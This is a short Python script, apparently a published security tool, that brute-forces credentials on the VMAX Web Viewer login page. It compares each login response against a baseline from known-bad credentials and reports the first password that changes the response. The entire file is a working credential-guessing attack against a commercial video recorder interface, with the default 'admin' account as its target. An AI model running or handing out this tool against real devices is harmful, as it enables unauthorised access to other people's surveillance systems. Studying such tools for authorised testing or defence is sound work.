#! /usr/bin/env python
"""
Simple script for brute-forcing VMAX Web Viewer credentials
https://digital-watchdog.com/productdetail/VMAX/

Copyright (C) 2019 Thomas Valadez (@tvldz)
"""
import sys
import argparse
import requests
import hashlib

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", help="the IP or domain of the VMAX Web Viewer")
    parser.add_argument("-u", "--username", help="the account username to brute force", default="admin") # default VMAX username is 'admin'
    parser.add_argument("-f","--file", help="path to a password file")
    args = parser.parse_args()

    # get standard response to invalid credentials
    r = requests.post('http://{}/Login.cgi'.format(args.domain), data={'login_txt_id':'8fkewic8h','login_txt_pw':'j02nd812bn4'})
    baseline_status_code = r.status_code
    m = hashlib.md5() # md5 is fine for this purpose
    m.update(r.text.encode('utf-8'))
    baseline_response_hash = m.hexdigest()

    with open(args.file, 'r') as filehandle:
        for line in filehandle:
            r = requests.post('http://{}/Login.cgi'.format(args.domain), data={'login_txt_id':args.username,'login_txt_pw':line.rstrip()})
            m = hashlib.md5()
            m.update(r.text.encode('utf-8'))
            print("{} {}".format(line.rstrip(), m.hexdigest()))
            if m.hexdigest() != baseline_response_hash or r.status_code != baseline_status_code:
                print('FOUND?:\n{}\n{}\n{}\n{}'.format(args.domain, args.username, line.rstrip(), m.hexdigest()))
                sys.exit()

if __name__ == '__main__':
    main()
